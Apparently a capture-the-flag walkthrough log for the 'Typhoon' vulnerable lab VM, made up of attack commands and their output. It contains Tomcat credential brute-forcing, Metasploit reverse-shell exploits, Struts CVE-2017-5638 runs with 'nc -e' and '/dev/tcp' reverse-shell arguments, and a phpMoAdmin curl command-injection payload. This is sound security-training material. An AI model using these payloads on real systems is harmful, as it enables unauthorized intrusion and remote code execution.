+    `~~88~~' `8b  d8' 88  `8D 88   88 .8P  Y8. .8P  Y8. 888o  88 
+       88     `8bd8'  88oodD' 88ooo88 88    88 88    88 88V8o 88 
+       88       88    88~~~   88~~~88 88    88 88    88 88 V8o88 
+       88       88    88      88   88 `8b  d8' `8b  d8' 88  V888 
+       YP       YP    88      YP   YP  `Y88P'   `Y88P'  VP   V8P 
+                                                             
+                 Vulnerable VM By PRISMA CSI - www.prismacsi.com
+
+WARNING:  Unauthorized access to this system is forbidden and will be
+prosecuted by law. By accessing this system, you agree that your actions
+may be monitored if unauthorized usage is suspected.
+
+		This is a joke of course :))
+		Please hack me!
+
+-----------------------------------------------------------------------
+admin@192.168.1.104's password: 
+Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Sun Feb  3 02:46:48 EET 2019
+
+  System load: 1.87               Memory usage: 2%   Processes:       132
+  Usage of /:  20.8% of 17.34GB   Swap usage:   0%   Users logged in: 0
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+Last login: Fri Oct 26 00:00:04 2018
+
+admin@typhoon:~$ sudo su
+[sudo] password for admin: 
+
+root@typhoon:/home/admin# 
+
+root@typhoon:/home/admin# cd /root
+root@typhoon:~# ls
+root-flag
+
+root@typhoon:~# cat root-flag 
+<Congrats!>
+
+Typhoon_r00t3r!
+
+</Congrats!>
+
+root@typhoon:~# 
+
+==========================================================================================================
+
+msf5 > use auxiliary/scanner/http/tomcat_mgr_login
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > options
+
+Module options (auxiliary/scanner/http/tomcat_mgr_login):
+
+   Name              Current Setting                                                                 Required  Description
+   ----              ---------------                                                                 --------  -----------
+   BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list
+   PASSWORD                                                                                          no        The HTTP password to specify for authentication
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
+   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS            192.168.1.104                                                                   yes       The target address range or CIDR identifier
+   RPORT             8080                                                                            yes       The target port (TCP)
+   SSL               false                                                                           no        Negotiate SSL/TLS for outgoing connections
+   STOP_ON_SUCCESS   false                                                                           yes       Stop guessing when a credential works for a host
+   TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html
+   THREADS           1                                                                               yes       The number of concurrent threads
+   USERNAME                                                                                          no        The HTTP username to specify for authentication
+   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                                                                           no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
+   VERBOSE           true                                                                            yes       Whether to print output for all attempts
+   VHOST                                                                                             no        HTTP server virtual host
+
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > run
+
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.1.104:8080 - LOGIN FAILED: admin:admin (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: admin:manager (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: admin:role1 (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: admin:root (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: manager:admin (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: manager:manager (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: manager:role1 (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: manager:root (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: manager:tomcat (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: manager:s3cret (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: manager:vagrant (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: role1:admin (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: role1:manager (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: role1:role1 (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: role1:root (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: role1:tomcat (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: role1:s3cret (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: role1:vagrant (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: root:admin (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: root:manager (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: root:role1 (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: root:root (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: root:tomcat (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: root:s3cret (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: root:vagrant (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: tomcat:root (Incorrect)
+
+[+] 192.168.1.104:8080 - Login Successful: tomcat:tomcat
+
+[-] 192.168.1.104:8080 - LOGIN FAILED: both:admin (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: both:manager (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: both:role1 (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: both:root (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: both:tomcat (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: both:s3cret (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: both:vagrant (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: j2deployer:j2deployer (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: cxsdk:kdsxc (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: root:owaspbwa (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: ADMIN:ADMIN (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: xampp:xampp (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: QCC:QLogic66 (Incorrect)
+[-] 192.168.1.104:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+============================================================================================================
+
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > back
+msf5 > use exploit/multi/http/tomcat_jsp_upload_bypass
+msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > options
+
+Module options (exploit/multi/http/tomcat_jsp_upload_bypass):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.1.104    yes       The target address range or CIDR identifier
+   RPORT      8080             yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The URI path of the Tomcat installation
+   VHOST                       no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > run
+
+[*] Started reverse TCP handler on 192.168.1.9:4444 
+[*] Uploading payload...
+[-] Exploit aborted due to failure: unexpected-reply: Failed to upload the payload
+[*] Exploit completed, but no session was created.
+
+===========================================================================================
+
+http://192.168.1.104:8080/manager/html
+
+msf5 > use exploit/multi/http/tomcat_mgr_upload 
+msf5 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf5 exploit(multi/http/tomcat_mgr_upload) > set httpPassword tomcat
+httpPassword => tomcat
+msf5 exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
+httpusername => tomcat
+msf5 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080
+RHOSTS => 8080
+Module options (exploit/multi/http/tomcat_mgr_upload):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword  tomcat           no        The password for the specified username
+   HttpUsername  tomcat           no        The username to authenticate as
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS        192.168.1.104    yes       The target address range or CIDR identifier
+   RPORT         8080             yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.9      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Java Universal
+
+
+msf5 exploit(multi/http/tomcat_mgr_upload) > run
+
+[*] Started reverse TCP handler on 192.168.1.9:4444 
+[*] Retrieving session ID and CSRF token...
+[*] Uploading and deploying Ch3pn...
+[*] Executing Ch3pn...
+[*] Undeploying Ch3pn ...
+[*] Sending stage (53845 bytes) to 192.168.1.104
+[*] Meterpreter session 1 opened (192.168.1.9:4444 -> 192.168.1.104:34547) at 2019-02-03 01:15:50 +0100
+
+meterpreter > sysinfo
+Computer    : typhoon.local
+OS          : Linux 3.13.0-32-generic (amd64)
+Meterpreter : java/linux
+
+meterpreter > shell
+Process 1 created.
+Channel 1 created.
+
+id
+uid=116(tomcat7) gid=126(tomcat7) groups=126(tomcat7)
+
+ifconfig
+docker0   Link encap:Ethernet  HWaddr 02:42:fa:93:4d:18  
+          inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
+          UP BROADCAST MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+
+eth0      Link encap:Ethernet  HWaddr 08:00:27:34:bf:f6  
+          inet addr:192.168.1.104  Bcast:192.168.1.255  Mask:255.255.255.0
+          inet6 addr: 2a01:e35:2fef:d7e0:a00:27ff:fe34:bff6/64 Scope:Global
+          inet6 addr: 2a01:e35:2fef:d7e0:fdf2:ca42:b9a0:afa0/64 Scope:Global
+          inet6 addr: fe80::a00:27ff:fe34:bff6/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:140322 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:142206 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:168586621 (168.5 MB)  TX bytes:20732706 (20.7 MB)
+
+<SNIP>
+=====================================================================================================
+
+http://192.168.1.104:8080/struts2-showcase/showcase.jsp
+
+Upload a file using Apche Struts upload functionalities:
+--------------------------------------------------------
+=> http://192.168.1.104:8080/struts2-showcase/fileupload/upload.action
+=> http://192.168.1.104:8080/struts2-showcase/fileupload/multipleUploadUsingList.action
+
+
+http://192.168.1.104:8080/struts2-showcase/integration/editGangster
+
+
+root@Security-Audit-01:~# searchsploit showcase
+----------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                         |  Path
+                                                                       | (/usr/share/exploitdb/)
+----------------------------------------------------------------------- ----------------------------------------
+Apache Struts 2 - Struts 1 Plugin Showcase OGNL Code Execution (Metasp | exploits/multiple/remote/44643.rb
+Apache Struts 2.3.x Showcase - Remote Code Execution                   | exploits/multiple/webapps/42324.py
+Bits Video Script 2.05 Gold Beta - 'showcase2search.php?rowptem[templa | exploits/php/webapps/34117.txt
+Bits Video Script 2.05 Gold Beta - 'showcasesearch.php?rowptem[templat | exploits/php/webapps/34116.txt
+Joomla! Component ProductShowcase 1.5 - SQL Injection                  | exploits/php/webapps/5237.txt
+Joomla! Component com_jashowcase - 'catid' SQL Injection               | exploits/php/webapps/7717.pl
+Joomla! Component com_jashowcase - Directory Traversal                 | exploits/php/webapps/11090.txt
+Minishowcase 09b136 - 'lang' Local File Inclusion                      | exploits/php/webapps/6156.txt
+----------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+
+root@Security-Audit-01:~# searchsploit -x 42324
+
+  Exploit: Apache Struts 2.3.x Showcase - Remote Code Execution
+  URL: https://www.exploit-db.com/exploits/42324/
+  Path: /usr/share/exploitdb/exploits/multiple/webapps/42324.py
+  File Type: Python script, ASCII text executable, with CRLF line terminators
+
+
+
+nc -lvp 443
+
+python3 42324.py http://192.168.1.104:8080/struts2-showcase/integration/saveGangster.action "nc -e /bin/bash 192.168.1.9 443"
+=> Failed
+
+python3 42324.py http://192.168.1.104:8080/struts2-showcase/integration/saveGangster.action "bash -i >& /dev/tcp/192.168.1.104/1234 0>&1"
+=> Failed
+
+root@Security-Audit-01:~# nmap --script http-vuln-cve2017-5638 --script-args path=/struts2-showcase/integration/editGangster.action 192.168.1.104
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-03 17:23 CET
+Nmap scan report for 192.168.1.104
+Host is up (0.00016s latency).
+Not shown: 983 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+25/tcp   open  smtp
+53/tcp   open  domain
+80/tcp   open  http
+110/tcp  open  pop3
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+143/tcp  open  imap
+445/tcp  open  microsoft-ds
+631/tcp  open  ipp
+993/tcp  open  imaps
+995/tcp  open  pop3s
+2049/tcp open  nfs
+3306/tcp open  mysql
+5432/tcp open  postgresql
+8080/tcp open  http-proxy
+| http-vuln-cve2017-5638: 
+|   VULNERABLE:
+|   Apache Struts Remote Code Execution Vulnerability
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-5638
+|       Apache Struts 2.3.5 - Struts 2.3.31 and Apache Struts 2.5 - Struts 2.5.10 are vulnerable to a Remote Code Execution
+|       vulnerability via the Content-Type header.
+|           
+|     Disclosure date: 2017-03-07
+|     References:
+|       https://cwiki.apache.org/confluence/display/WW/S2-045
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
+|_      http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html
+MAC Address: 08:00:27:34:BF:F6 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
+
+==========================================================================================================
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts# searchsploit apache struts
+----------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                         |  Path
+                                                                       | (/usr/share/exploitdb/)
+----------------------------------------------------------------------- ----------------------------------------
+Apache Struts - 'ParametersInterceptor' Remote Code Execution (Metaspl | exploits/multiple/remote/24874.rb
+Apache Struts - ClassLoader Manipulation Remote Code Execution (Metasp | exploits/multiple/remote/33142.rb
+Apache Struts - Developer Mode OGNL Execution (Metasploit)             | exploits/java/remote/31434.rb
+Apache Struts - Dynamic Method Invocation Remote Code Execution (Metas | exploits/linux/remote/39756.rb
+Apache Struts - Multiple Persistent Cross-Site Scripting Vulnerabiliti | exploits/multiple/webapps/18452.txt
+Apache Struts - OGNL Expression Injection                              | exploits/multiple/remote/38549.txt
+Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code | exploits/multiple/remote/39919.rb
+Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code | exploits/multiple/remote/43382.py
+Apache Struts - includeParams Remote Code Execution (Metasploit)       | exploits/multiple/remote/25980.rb
+Apache Struts 1.2.7 - Error Response Cross-Site Scripting              | exploits/multiple/remote/26542.txt
+Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution (Me | exploits/multiple/remote/27135.rb
+Apache Struts 2 - Namespace Redirect OGNL Injection (Metasploit)       | exploits/multiple/remote/45367.rb
+Apache Struts 2 - Skill Name Remote Code Execution                     | exploits/multiple/remote/37647.txt
+Apache Struts 2 - Struts 1 Plugin Showcase OGNL Code Execution (Metasp | exploits/multiple/remote/44643.rb
+Apache Struts 2 < 2.3.1 - Multiple Vulnerabilities                     | exploits/multiple/webapps/18329.txt
+Apache Struts 2.0 - 'XSLTResult.java' Arbitrary File Upload            | exploits/java/webapps/37009.xml
+Apache Struts 2.0.0 < 2.2.1.1 - XWork 's:submit' HTML Tag Cross-Site S | exploits/multiple/remote/35735.txt
+Apache Struts 2.0.1 < 2.3.33 / 2.5 < 2.5.10 - Arbitrary Code Execution | exploits/multiple/remote/44556.py
+Apache Struts 2.0.9/2.1.8 - Session Tampering Security Bypass          | exploits/multiple/remote/36426.txt
+Apache Struts 2.2.1.1 - Remote Command Execution (Metasploit)          | exploits/multiple/remote/18984.rb
+Apache Struts 2.2.3 - Multiple Open Redirections                       | exploits/multiple/remote/38666.txt
+Apache Struts 2.3 < 2.3.34 / 2.5 < 2.5.16 - Remote Code Execution (1)  | exploits/linux/remote/45260.py
+Apache Struts 2.3 < 2.3.34 / 2.5 < 2.5.16 - Remote Code Execution (2)  | exploits/multiple/remote/45262.py
+Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - 'Jakarta' Multipart Pars | exploits/multiple/remote/41614.rb
+Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - Remote Code Execution    | exploits/linux/webapps/41570.py
+Apache Struts 2.3.x Showcase - Remote Code Execution                   | exploits/multiple/webapps/42324.py
+Apache Struts 2.5 < 2.5.12 - REST Plugin XStream Remote Code Execution | exploits/linux/remote/42627.py
+Apache Struts < 1.3.10 / < 2.3.16.2 - ClassLoader Manipulation Remote  | exploits/multiple/remote/41690.rb
+Apache Struts < 2.2.0 - Remote Command Execution (Metasploit)          | exploits/multiple/remote/17691.rb
+Apache Struts2 2.0.0 < 2.3.15 - Prefixed Parameters OGNL Injection     | exploits/multiple/webapps/44583.txt
+----------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+
+==========================================================================================================
+
+=> Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - Remote Code Execution | exploits/linux/webapps/41570.py
+
+root@Security-Audit-01:~# searchsploit -x 41570
+  Exploit: Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/41570/
+     Path: /usr/share/exploitdb/exploits/linux/webapps/41570.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+root@Security-Audit-01:~# cd Desktop/CTFs/Typhoon/struts/
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts# cp /usr/share/exploitdb/exploits/linux/webapps/41570.py ./
+
+----------------------------------------------------------------------------------------------
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts# ./41570.py http://192.168.1.104/struts2-showcase/integration/editGangster.action "id"
+bash: ./41570.py: /usr/bin/python^M: bad interpreter: No such file or directory
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts# dos2unix 41570.py 
+dos2unix: converting file 41570.py to Unix format...
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts# python2 ./41570.py http://192.168.1.104:8080/struts2-showcase/integration/editGangster.action "whoami"
+[*] CVE: 2017-5638 - Apache Struts2 S2-045
+[*] cmd: whoami
+
+tomcat7
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts# python2 ./41570.py http://192.168.1.104:8080/struts2-showcase/integration/editGangster.action "hostname"
+[*] CVE: 2017-5638 - Apache Struts2 S2-045
+[*] cmd: hostname
+
+typhoon.local
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts# python2 ./41570.py http://192.168.1.104:8080/struts2-showcase/integration/editGangster.action "uname -a"
+[*] CVE: 2017-5638 - Apache Struts2 S2-045
+[*] cmd: uname -a
+
+Linux typhoon.local 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts# python2 ./41570.py http://192.168.1.104:8080/struts2-showcase/integration/editGangster.action "pwd"
+[*] CVE: 2017-5638 - Apache Struts2 S2-045
+[*] cmd: pwd
+
+/var/lib/tomcat7
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts# python2 ./41570.py http://192.168.1.104:8080/struts2-showcase/integration/editGangster.action "ls -al"
+[*] CVE: 2017-5638 - Apache Struts2 S2-045
+[*] cmd: ls -al
+
+total 24
+drwxr-xr-x  6 root    root    4096 Oct 22 22:38 .
+drwxr-xr-x 60 root    root    4096 Oct 24 00:33 ..
+drwxr-xr-x  3 tomcat7 tomcat7 4096 Oct 22 22:38 common
+lrwxrwxrwx  1 root    root      12 Feb 27  2014 conf -> /etc/tomcat7
+lrwxrwxrwx  1 root    root      17 Feb 27  2014 logs -> ../../log/tomcat7
+drwxr-xr-x  3 tomcat7 tomcat7 4096 Oct 22 22:38 server
+drwxr-xr-x  3 tomcat7 tomcat7 4096 Oct 22 22:38 shared
+drwxrwxr-x  6 tomcat7 tomcat7 4096 Feb  3 02:15 webapps
+lrwxrwxrwx  1 root    root      19 Feb 27  2014 work -> ../../cache/tomcat7
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts# 
+
+===========================================================================================================
+
+Web App CUPS 1.7.2
+
+http://192.168.1.104:631/help/?QUERY=GNU&SEARCH=Search
+
+https://192.168.1.104:631/admin/
+=> Edit configuration
+? disable authent by adding NONE instead of BASIC ?
+
+
+root@Security-Audit-01:~# nikto -h https://192.168.1.104:631/
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.104
++ Target Hostname:    192.168.1.104
++ Target Port:        631
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /CN=typhoon
+                   Ciphers:  AES256-SHA256
+                   Issuer:   /CN=typhoon
++ Start Time:         2019-02-03 20:58:08 (GMT1)
+---------------------------------------------------------------------------
++ Server: CUPS/1.7 IPP/2.1
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Hostname '192.168.1.104' does not match certificate's names: typhoon
++ Cookie org.cups.sid created without the secure flag
++ Cookie org.cups.sid created without the httponly flag
++ Allowed HTTP Methods: GET, HEAD, OPTIONS, POST, PUT 
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ /admin.cgi: InterScan VirusWall administration is accessible without authentication.
++ OSVDB-3092: /ca/: This might be interesting... potential country code (Canada)
++ OSVDB-3092: /fr/: This might be interesting... potential country code (France)
++ OSVDB-3092: /de/: This might be interesting... potential country code (Germany)
++ OSVDB-3092: /it/: This might be interesting... potential country code (Italy)
++ OSVDB-3092: /ru/: This might be interesting... potential country code (Russian Federation)
++ OSVDB-3092: /es/: This might be interesting... potential country code (Spain)
++ 7535 requests: 0 error(s) and 16 item(s) reported on remote host
++ End Time:           2019-02-03 21:01:54 (GMT1) (226 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+=========================================================================================================
+
+msf5 > search lotuscms
+
+Matching Modules
+================
+
+   Name                              Disclosure Date  Rank       Check  Description
+   ----                              ---------------  ----       -----  -----------
+   exploit/multi/http/lcms_php_exec  2011-03-03       excellent  Yes    LotusCMS 3.0 eval() Remote Command Execution
+
+msf5 > use exploit/multi/http/lcms_php_exec
+msf5 exploit(multi/http/lcms_php_exec) > options
+
+Module options (exploit/multi/http/lcms_php_exec):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   URI      /lcms/           yes       URI
+   VHOST                     no        HTTP server virtual host
+
+Exploit target:
+   Id  Name
+   --  ----
+   0   Automatic LotusCMS 3.0
+
+
+msf5 exploit(multi/http/lcms_php_exec) > set URI /cms/
+URI => /cms/
+msf5 exploit(multi/http/lcms_php_exec) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf5 exploit(multi/http/lcms_php_exec) > options
+
+Module options (exploit/multi/http/lcms_php_exec):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   192.168.1.104    yes       The target address range or CIDR identifier
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   URI      /cms/            yes       URI
+   VHOST                     no        HTTP server virtual host
+
+Exploit target:
+   Id  Name
+   --  ----
+   0   Automatic LotusCMS 3.0
+
+msf5 exploit(multi/http/lcms_php_exec) > run
+
+[*] Started reverse TCP handler on 192.168.1.9:4444 
+[*] Using found page param: /cms/index.php?page=index
+[*] Sending exploit ...
+[*] Sending stage (38247 bytes) to 192.168.1.104
+[*] Meterpreter session 1 opened (192.168.1.9:4444 -> 192.168.1.104:42260) at 2019-02-11 01:38:09 +0100
+
+meterpreter > 
+meterpreter > sysinfo
+Computer    : typhoon.local
+OS          : Linux typhoon.local 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64
+Meterpreter : php/linux
+meterpreter > whoami
+[-] Unknown command: whoami.
+meterpreter > id
+[-] Unknown command: id.
+meterpreter > shell
+Process 2373 created.
+Channel 0 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+pwd
+/var/www/html/cms
+
+=========================================================================================================
+
+=> phpmoadmin
+=> http://192.168.1.104/mongoadmin/index.php
+
+
+root@Security-Audit-01:~# searchsploit phpmoadmin
+----------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                         |  Path
+                                                                       | (/usr/share/exploitdb/)
+----------------------------------------------------------------------- ----------------------------------------
+PHPMoAdmin - Unauthorized Remote Code Execution                        | exploits/php/webapps/36251.txt
+phpMoAdmin MongoDB GUI 1.1.5 - Cross-Site Request Forgery / Cross-Site | exploits/php/webapps/46082.txt
+----------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+
+
+root@Security-Audit-01:~# searchsploit -x 36251
+  Exploit: PHPMoAdmin - Unauthorized Remote Code Execution
+  URL: https://www.exploit-db.com/exploits/36251/
+  Path: /usr/share/exploitdb/exploits/php/webapps/36251.txt
+  File Type: ASCII text, with CRLF line terminators
+
+
+Original exploit
+=================
+$ curl "http://path.to/moadmin.php" -d "object=1;system('id');exit"
+
+
+Modified exploit (just add the right web page)
+===============================================
+
+root@Security-Audit-01:~#  curl "http://192.168.1.104/mongoadmin/index.php" -d "object=1;system('id');exit"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+root@Security-Audit-01:~# curl "http://192.168.1.104/mongoadmin/index.php" -d "object=1;system('hostname');exit"typhoon.local
+
+root@Security-Audit-01:~# curl "http://192.168.1.104/mongoadmin/index.php" -d "object=1;system('pwd');exit"
+/var/www/html/mongoadmin
+root@Security-Audit-01:~# 
+
+
+=> Note: MSF exploit was not working
+
+
+=========================================================================================================
+SAMBA testing
+=========================================================================================================
+
+nmap -p 139,445 --script vuln --script-args unsafe=1 192.168.13.208
+Nmap scan report for typhoon.local.axatrs.mgmt (192.168.13.208)
+Host is up (0.00011s latency).
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+MAC Address: 00:0C:29:11:F9:45 (VMware)
+
+Host script results:
+| smb-vuln-cve-2017-7494: 
+|   VULNERABLE:
+|   SAMBA Remote Code Execution from Writable Share
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-7494
+|     Risk factor: HIGH  CVSSv3: 7.5 (HIGH) (CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H)
+|       All versions of Samba from 3.5.0 onwards are vulnerable to a remote
+|       code execution vulnerability, allowing a malicious client to upload a
+|       shared library to a writable share, and then cause the server to load
+|       and execute it.
+|       
+|     Disclosure date: 2017-05-24
+|     Check results:
+|       Samba Version: 4.1.6-Ubuntu
+|       Writable share found. 
+|        Name: \\192.168.13.208\typhoon
+|        Path: C:\tmp 
+|       Exploitation of CVE-2017-7494 succeeded!
+|     Extra information:
+|       All writable shares:
+|        Name: \\192.168.13.208\typhoon
